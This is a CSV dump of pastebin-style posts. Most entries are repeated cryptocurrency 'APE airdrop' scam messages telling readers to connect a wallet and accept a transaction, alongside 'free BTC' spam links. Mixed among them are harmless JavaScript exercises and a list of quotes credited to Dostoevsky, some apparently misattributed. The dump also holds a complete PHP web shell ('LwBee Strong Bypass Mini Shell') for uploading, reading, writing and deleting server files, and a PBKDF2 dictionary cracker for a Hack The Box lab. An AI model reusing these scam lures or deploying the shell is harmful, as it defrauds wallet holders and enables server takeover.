id,title,username,language,date,content
wwNL8VrU,🔥 Make $500+ from APE AIRDROP 🔥,herrderringe,JavaScript,Thursday 27th of February 2025 11:40:43 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#JB3AYDP2Vc"
cBUzd7TU,Untitled,Kamend1,JavaScript,Thursday 27th of February 2025 11:36:48 AM CDT,"function solve (numbers) {
    numbers.sort((a, b) => a - b);
    let len = numbers.length;
    let result = [];

    for (i = 0; i < len; i++) {
        if (i % 2 == 0) {
            let num = numbers.shift();
            result.push(num);
        } else {
            let num = numbers.pop();
            result.push(num);
        }
    }

    return result;
}"
6fwNnRbQ,Untitled,Onesible,JavaScript,Thursday 27th of February 2025 11:36:01 AM CDT,"function solve(arr) {
    let newArr = [];
    arr.sort((a, b) => a - b);
    
    while (arr.length > 0) {
        newArr.push(arr.shift(), arr.pop());
    }
    
    return newArr
}"
NMbeQpas,🚨 FINAL CALL - $APE AIRDROP 🚨,herrderringe,JavaScript,Thursday 27th of February 2025 11:30:41 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#Ymcza19h67"
8721fxff,🔥 FREE BTC METHOD X9,Ineedcodes,JavaScript,Thursday 27th of February 2025 11:28:05 AM CDT,"
 
Guide: https://2cm.es/giftcodemethod 
 
PAS #oOdNFh90zr

"
BB92uKsx,🚨 LAST CHANCE TO CLAIM APE COINS 🚨,herrderringe,JavaScript,Thursday 27th of February 2025 11:20:37 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#ZZj5q1W1eH"
AcqdSkDs,Quotes,haithamaouati,JSON,Thursday 27th of February 2025 11:18:09 AM CDT,"[
    {
      ""quote"": ""The mystery of human existence lies not in just staying alive, but in finding something to live for."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""Man is sometimes extraordinarily, passionately, in love with suffering."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""To love someone means to see them as God intended them."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""The soul is healed by being with children."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""Nothing in this world is harder than speaking the truth, nothing easier than flattery."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""Lying to ourselves is more deeply ingrained than lying to others."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""It takes something more than intelligence to act intelligently."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""If you want to overcome the whole world, overcome yourself."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""The best way to keep a prisoner from escaping is to make sure he never knows he's in prison."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""Suffering is part and parcel of extensive intelligence and a feeling heart."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""Taking a new step, uttering a new word, is what people fear most."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""Much unhappiness has come into the world because of bewilderment and things left unsaid."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""Pain and suffering are always inevitable for a large intelligence and a deep heart."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""There is no subject so old that something new cannot be said about it."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""Power is given only to those who dare to lower themselves and pick it up."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""Man only likes to count his troubles; he doesn't calculate his happiness."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""The darker the night, the brighter the stars, the deeper the grief, the closer is God."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""A man who lies to himself, and believes his own lies, becomes unable to recognize truth."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""Wealth is the number of things one can do without."",
      ""author"": ""Fyodor Dostoevsky""
    },
    {
      ""quote"": ""Destroy my desires, eradicate my ideals, show me something better, and I will follow you."",
      ""author"": ""Fyodor Dostoevsky""
    }
]"
HrAX71xe,🔥 Make $1000+ FREE PT,Ineedcodes,JavaScript,Thursday 27th of February 2025 11:11:21 AM CDT,"
 
Guide: https://2cm.es/giftcodemethod 
 
PAS #O0rwB7KPf0

"
pqRj1eaV,FREE CRYPTO,herrderringe,JavaScript,Thursday 27th of February 2025 11:10:33 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#Gak6W2ArZ2"
WwXuD8SC,🔥 Make $500+ from APE AIRDROP 🔥,herrderringe,JavaScript,Thursday 27th of February 2025 11:00:31 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#k2BDiCOSTf"
rswBG4wY,HTB Titanic - Crack pbkdf2,Haxguy,Python,Thursday 27th of February 2025 10:51:44 AM CDT,"#!/usr/bin/env python3

import hashlib
import binascii
import sys
import time
import select

def derive_pbkdf2(password: bytes, salt: bytes, rounds: int, length: int) -> bytes:
    return hashlib.pbkdf2_hmac(
        hash_name='sha256',
        password=password,
        salt=salt,
        iterations=rounds,
        dklen=length
    )

# All ""pbkdf2$50000$50"" users
hashes = [

# Enter in username, passwd_hex, and salt_hex
    {
        ""username"": ""admin"",
        ""passwd_hex"": ""86a6137c28fda328c8e6abbcb53e4ac534dc9c010bb40468ce4b8f4bf882c0c1c1d2396d45e7ee16bc592260e74c8bbdd6f2"",
        ""salt_hex"":   ""5d3f4c5b71ae98ebdc2520449f6c56f8"",
        ""iterations"": 50000,
        ""dklen"": 50
    },
    {
        ""username"": ""user1"",
        ""passwd_hex"": ""7f2acfe2bdc0afe9cbb54aac932230de2a1032e8bfcd5706308cabd41f75151b51278207c2c6141321655612c1c54ad24fac"",
        ""salt_hex"":   ""e9facc6971e7440b5e04f10765e833d1"",
        ""iterations"": 50000,
        ""dklen"": 50
    }

# Add others as needed...
]

# Convert from hex to bytes
for h in hashes:
    h[""passwd_bytes""] = binascii.unhexlify(h[""passwd_hex""])
    h[""salt_bytes""]   = binascii.unhexlify(h[""salt_hex""])
    h[""cracked""]      = False

wordlist = ""/usr/share/wordlists/rockyou.txt""
time_limit_seconds = 600  # 10 minutes per user

print(f""[+] Will spend up to {time_limit_seconds}s (={time_limit_seconds/60:.1f} min) per hash."")
print(""[+] Press 's' + Enter at any time to skip the current hash.\n"")

def crack_one_hash(user_hash, wordlist_path, time_limit):
    """"""
    Attempt to crack a single user's PBKDF2-HMAC-SHA256 within 'time_limit' seconds.
    Returns the plaintext password or None if not found / skipped / timed out.
    """"""
    user   = user_hash[""username""]
    target = user_hash[""passwd_bytes""]
    start_time = time.time()

    print(f""[*] Cracking {user} for up to {time_limit} seconds... (Press 's' + Enter to skip)"")

    try:
        with open(wordlist_path, ""r"", encoding=""utf-8"", errors=""ignore"") as f:
            for line in f:
                # 1) Check if user wants to skip
                if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                    key_press = sys.stdin.read(1)
                    if key_press.lower() == 's':
                        print(f""[-] User pressed 's' to skip {user}. Moving on.\n"")
                        return None

                # 2) Check time limit
                if (time.time() - start_time) > time_limit:
                    print(f""[-] Time limit reached for {user}. Moving on.\n"")
                    return None

                pwd_str = line.strip()
                if not pwd_str:
                    continue

                pwd_bytes = pwd_str.encode('utf-8')
                derived = derive_pbkdf2(
                    password=pwd_bytes,
                    salt=user_hash[""salt_bytes""],
                    rounds=user_hash[""iterations""],
                    length=user_hash[""dklen""]
                )
                if derived == target:
                    print(f""[!] SUCCESS: {user}'s password is '{pwd_str}'\n"")
                    return pwd_str

    except FileNotFoundError:
        print(f""[!] Wordlist not found: {wordlist_path}"")
        return None

    # If finished dictionary with no match
    print(f""[!] Dictionary exhausted for {user}, no match.\n"")
    return None

# ------------------------------------------------
# Main Loop: process each user sequentially
# ------------------------------------------------
for user_hash in hashes:
    if user_hash[""cracked""]:
        continue

    found_pass = crack_one_hash(user_hash, wordlist, time_limit_seconds)
    if found_pass:
        user_hash[""cracked""] = True

print(""[+] Done. Any user not shown as cracked wasn't found within time or dictionary."")

"
SkzVE8Pf,🚨 FINAL CALL - $APE AIRDROP 🚨,herrderringe,JavaScript,Thursday 27th of February 2025 10:50:29 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#CeNpiauP2d"
iv9gdavv,Untitled,Onesible,JavaScript,Thursday 27th of February 2025 10:45:29 AM CDT,"function solve(arr) {
    arr.sort((a, b) => a.localeCompare(b));

    for (let [i, value] of arr.entries()) {
        console.log(`${i + 1}.${value}`)
    }
}
"
6D1PVtgF,Untitled,Onesible,JavaScript,Thursday 27th of February 2025 10:39:15 AM CDT,"function rotateArray(arr, num) {
    let newArr = [];

    num = num % arr.length;
    newArr = arr.slice(num).concat(arr.slice(0, num));

    console.log(newArr.join(' '));
}"
VuHaaXjK,🚨 LAST CHANCE TO CLAIM APE COINS 🚨,SkyHighDevelops,JavaScript,Thursday 27th of February 2025 10:37:07 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#vj5DAvDvKO"
tKZ5pV3n,FREE CRYPTO,SkyHighDevelops,JavaScript,Thursday 27th of February 2025 10:27:05 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#YgMa9Z1zpm"
ZabQtjbV,🔥 Make $500+ from APE AIRDROP 🔥,SkyHighDevelops,JavaScript,Thursday 27th of February 2025 10:17:02 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#dzYVQK0tJq"
58cdBnrN,bpshell1,b3gund4L,PHP,Thursday 27th of February 2025 10:11:48 AM CDT,"<?php
function scanDirectory($path) {
    $items = [];
    if (is_dir($path)) {
        $scan = scandir($path);
        foreach ($scan as $item) {
            if ($item !== '.' && $item !== '..') {
                $fullPath = $path . DIRECTORY_SEPARATOR . $item;
                $items[] = [
                    'name' => $item,
                    'path' => $fullPath,
                    'type' => is_dir($fullPath) ? 'directory' : 'file'
                ];
            }
        }
    }
    usort($items, function($a, $b) {
        if ($a['type'] === 'directory' && $b['type'] !== 'directory') return -1;
        if ($a['type'] !== 'directory' && $b['type'] === 'directory') return 1;
        return strcasecmp($a['name'], $b['name']);
    });
    return $items;
}

function generateBreadcrumb($path) {
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $breadcrumb = [];
    $currentPath = '';
    foreach ($parts as $part) {
        $currentPath .= DIRECTORY_SEPARATOR . $part;
        $breadcrumb[] = '<a href=""?path=' . urlencode($currentPath) . '"">' . htmlspecialchars($part) . '</a>';
    }
    return implode(' / ', $breadcrumb);
}

$defaultRootPath = getcwd();
$rootPath = $_GET['path'] ?? $defaultRootPath;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_path'])) {
    $deletePath = $_POST['delete_path'];
    if (file_exists($deletePath)) {
        unlink($deletePath);
        echo ""<div class='alert alert-success'>File berhasil dihapus: <strong>"" . htmlspecialchars($deletePath) . ""</strong></div>"";
    } else {
        echo ""<div class='alert alert-danger'>File tidak ditemukan atau tidak dapat dihapus.</div>"";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['filename'])) {
    $path = $_POST['path'] ?? $rootPath;
    $filename = $_POST['filename'] ?? '';
    $content = $_POST['content'] ?? '';
    
    if (!empty($path) && !empty($filename)) {
        $filePath = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;
        file_put_contents($filePath, $content);
        echo ""<div class='alert alert-success'>File berhasil dibuat di: <strong>"" . htmlspecialchars($filePath) . ""</strong></div>"";
    } else {
        echo ""<div class='alert alert-danger'>Path dan nama file tidak boleh kosong.</div>"";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file_upload'])) {
    $uploadPath = $_POST['upload_path'] ?? $rootPath;
    
    if (!empty($uploadPath) && is_dir($uploadPath)) {
        $fileName = basename($_FILES['file_upload']['name']);
        $targetFile = rtrim($uploadPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $fileName;
        
        if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $targetFile)) {
            echo ""<div class='alert alert-success'>File berhasil diunggah ke: <strong>"" . htmlspecialchars($targetFile) . ""</strong></div>"";
        } else {
            echo ""<div class='alert alert-danger'>Gagal mengunggah file.</div>"";
        }
    } else {
        echo ""<div class='alert alert-danger'>Path tidak valid atau tidak ditemukan.</div>"";
    }
}

if (isset($_GET['view_file'])) {
    $filePath = $_GET['view_file'];
    if (file_exists($filePath) && is_file($filePath)) {
        $fileContent = htmlspecialchars(file_get_contents($filePath));
        echo ""<div class='alert alert-info'><strong>"" . htmlspecialchars($filePath) . ""</strong></div>"";
        echo ""<pre class='file-content'>$fileContent</pre>"";
    } else {
        echo ""<div class='alert alert-danger'>File tidak ditemukan atau tidak dapat dibuka.</div>"";
    }
}

$scannedItems = scanDirectory($rootPath);
?>

<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>@LwBee Strong Bypass</title>
    <style>
    * {
        box-sizing: border-box;
    }

    body {
        font-family: Arial, sans-serif;
        background-color: #362e2e;
        color: #ffffff;
        margin: 0;
        padding: 0 20px;
    }

    h2 {
        color: #ffffff;
        text-align: center;
    }

    .alert {
        padding: 20px;
        margin-bottom: 15px;
        border-radius: 5px;
        text-align: center;
    }

    .alert-success {
        background-color: #1b5e20;
        color: #a5d6a7;
    }

    .alert-danger {
        background-color: #b71c1c;
        color: #ff8a80;
    }

    .breadcrumb a {
        color: #64b5f6;
        text-decoration: none;
    }

    .breadcrumb a:hover {
        text-decoration: underline;
    }

    .file-list li {
        list-style: none;
        background: #302f2f;
        padding: 10px;
        margin: 10px 0;
        border-radius: 5px;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }

    button {
        background-color: #39ff14;
        color: #000000;
        border: none;
        border-radius: 5px;
        padding: 10px 20px;
        cursor: pointer;
        font-weight: bold;
    }

    button:hover {
        background-color: #32e014;
    }

    input[type=""file""], input[type=""text""], textarea {
        width: 100%;
        padding: 10px;
        margin: 10px 0;
        border: 1px solid #444;
        border-radius: 5px;
        background-color: #1e1e1e;
        color: #ffffff;
    }

    textarea {
        resize: none;
        height: 100px;
    }

    .form-upload, .form-create, .form-manager, .header, .footer {
        background-color: #1e1e1e;
        padding: 20px;
        border-radius: 5px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.5);
        margin-bottom: 20px;
    }

    ul.file-list {
        padding: 0;
    }

    .file-info {
        display: flex;
        align-items: center;
        flex: 1;
    }

    .file-info strong {
        margin-right: 10px;
    }

    .file-content {
        background-color: #1e1e1e;
        padding: 20px;
        border-radius: 5px;
        white-space: pre-wrap;
        border: 1px solid #444;
        font-family: 'Courier New', Courier, monospace;
        font-size: 14px;
        max-height: 400px;
        overflow-y: auto;
        color: #ffffff;
    }
    
    /* Warna khusus untuk link directory */
    a[href*=""?path=""] {
        color: #1a8a2c !important;
    }

</style>
</head>
<body>
<div class=""header"">
<h2>LwBee Strong Bypass Mini Shell</h2>
</div>

<div class=""form-upload"">
    <h3>Upload File</h3>
    <form action="""" method=""post"" enctype=""multipart/form-data"">
        <input type=""file"" name=""file_upload"" required>
        <input type=""hidden"" name=""upload_path"" value=""<?php echo htmlspecialchars($rootPath); ?>"">
        <button type=""submit"">Upload File</button>
    </form>
</div>

<div class=""form-create"">
    <h3>Create New File</h3>
    <form action="""" method=""post"">
        <input type=""text"" name=""path"" placeholder=""Path"" value=""<?php echo htmlspecialchars($rootPath); ?>"" required>
        <input type=""text"" name=""filename"" placeholder=""Filename"" required>
        <textarea name=""content"" placeholder=""File content""></textarea>
        <button type=""submit"">Create File</button>
    </form>
</div>

<div class=""form-manager"">
<ul class=""file-list"">
<div class=""breadcrumb"">
    <h3>Path: <?php echo generateBreadcrumb($rootPath); ?></h3>
	<hr>
</div>
    <?php foreach ($scannedItems as $item): ?>
        <li>
		<div class=""file-info"">
            <strong><?php echo $item['type'] === 'directory' ? '[Dir]' : '[File]'; ?></strong>
            <?php if ($item['type'] === 'directory'): ?>
                <a href=""?path=<?php echo urlencode($item['path']); ?>""> <?php echo htmlspecialchars($item['name']); ?></a>
            <?php else: ?>
                <a href=""?path=<?php echo urlencode($rootPath); ?>&view_file=<?php echo urlencode($item['path']); ?>""> <?php echo htmlspecialchars($item['name']); ?></a>
            <?php endif; ?>
            <?php if ($item['type'] === 'file'): ?>
		</div>
                <form action="""" method=""post"" style=""display: inline;"">
                    <input type=""hidden"" name=""delete_path"" value=""<?php echo htmlspecialchars($item['path']); ?>"">
                    <button type=""submit"">Hapus</button>
                </form>
            <?php endif; ?>
        </li>
    <?php endforeach; ?>
</ul>
</div>
<div class=""footer"">
<h4 style=""text-align: center;"">LwBee Bypass ©️ 2024
</div>
</body>
</html>"
XMHAVpe7,🚨 FINAL CALL - $APE AIRDROP 🚨,SkyHighDevelops,JavaScript,Thursday 27th of February 2025 10:06:59 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#NsEywTaIlN"
